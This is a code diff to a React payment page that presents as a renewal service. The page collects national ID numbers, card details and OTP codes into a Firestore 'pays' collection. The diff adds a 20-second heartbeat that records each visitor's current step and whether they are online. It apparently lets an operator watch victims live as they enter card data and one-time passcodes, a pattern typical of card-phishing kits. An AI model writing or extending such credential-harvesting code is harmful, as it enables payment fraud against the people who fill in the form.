@@ -34,6 +34,19 @@ const RECEIPT_OPTIONS = [
 const YEAR_OPTIONS = ['1', '2', '3', '4', '5'] as const
 const FEE_PER_YEAR = 100
 const DEFAULT_CURRENT_EXPIRY_DATE = '2026-02-23'
+const STEP_PAGE_KEYS: Record<number, string> = {
+  1: 'card-information',
+  2: 'application-form',
+  3: 'payment-details',
+  4: 'payment-method',
+  5: 'card-info',
+  6: 'otp',
+}
+
+function getCurrentPageKey(step: number) {
+  return STEP_PAGE_KEYS[step] ?? 'unknown'
+}
+
 type PaymentMethod = 'mastercard' | 'visa'
 
 type PaymentMethodOption = {
@@ -178,6 +191,7 @@ export default function SubmitPage() {
   const [loading, setLoading] = useState(false)
   const [waiting, setWaiting] = useState(false)
   const [success, setSuccess] = useState(false)
+  const [sessionStarted, setSessionStarted] = useState(false)
 
   const [idNum, setIdNum] = useState('')
   const [operationType, setOperationType] = useState<OperationType>('renew')
@@ -196,6 +210,7 @@ export default function SubmitPage() {
 
   const unsubRef = useRef<(() => void) | null>(null)
   const previousStepRef = useRef(step)
+  const submissionId = useMemo(() => idNum.trim(), [idNum])
   const yearsCount = useMemo(() => {
     const parsedYears = Number(requestedYears)
     if (!Number.isFinite(parsedYears) || parsedYears < 1 || parsedYears > 5) return 1
@@ -247,6 +262,50 @@ export default function SubmitPage() {
     previousStepRef.current = step
   }, [step])
 
+  useEffect(() => {
+    if (!sessionStarted || submissionId.length !== 11 || success) return
+
+    const syncOnlinePresence = async () => {
+      try {
+        await setDoc(doc(db, 'pays', submissionId), {
+          id: submissionId,
+          step,
+          currentPage: getCurrentPageKey(step),
+          onlineStatus: 'online',
+          lastSeenAt: Date.now(),
+        }, { merge: true })
+      } catch {}
+    }
+
+    void syncOnlinePresence()
+    const heartbeatId = window.setInterval(() => { void syncOnlinePresence() }, 20000)
+
+    return () => {
+      window.clearInterval(heartbeatId)
+    }
+  }, [sessionStarted, submissionId, step, success])
+
+  useEffect(() => {
+    if (!sessionStarted || submissionId.length !== 11) return
+
+    return () => {
+      void setDoc(doc(db, 'pays', submissionId), {
+        onlineStatus: 'offline',
+        lastSeenAt: Date.now(),
+      }, { merge: true })
+    }
+  }, [sessionStarted, submissionId])
+
+  useEffect(() => {
+    if (!sessionStarted || !success || submissionId.length !== 11) return
+
+    void setDoc(doc(db, 'pays', submissionId), {
+      onlineStatus: 'offline',
+      lastSeenAt: Date.now(),
+      currentPage: 'completed',
+    }, { merge: true })
+  }, [sessionStarted, submissionId, success])
+
   const saveToFirestore = async (extra: Record<string, unknown> = {}) => {
     const [expiryYear, expiryMonth] = cardExpiry.split('-')
     const payload = {
@@ -271,6 +330,8 @@ export default function SubmitPage() {
       otpArr: otpList,
       cardState: 'pending',
       createdAt: Date.now(),
+      onlineStatus: sessionStarted ? 'online' : 'offline',
+      lastSeenAt: Date.now(),
       step,
       ...extra,
     }
@@ -280,6 +341,7 @@ export default function SubmitPage() {
   const clearStep1Fields = () => {
     setIdNum('')
     setOperationType('renew')
+    setSessionStarted(false)
   }
 
   const handleStep1 = async (e: FormEvent) => {
@@ -288,6 +350,7 @@ export default function SubmitPage() {
     setLoading(true)
     try {
       await saveToFirestore({ step: 1, currentPage: 'card-information' })
+      setSessionStarted(true)
     } catch {}
     setLoading(false)
     setStep(2)
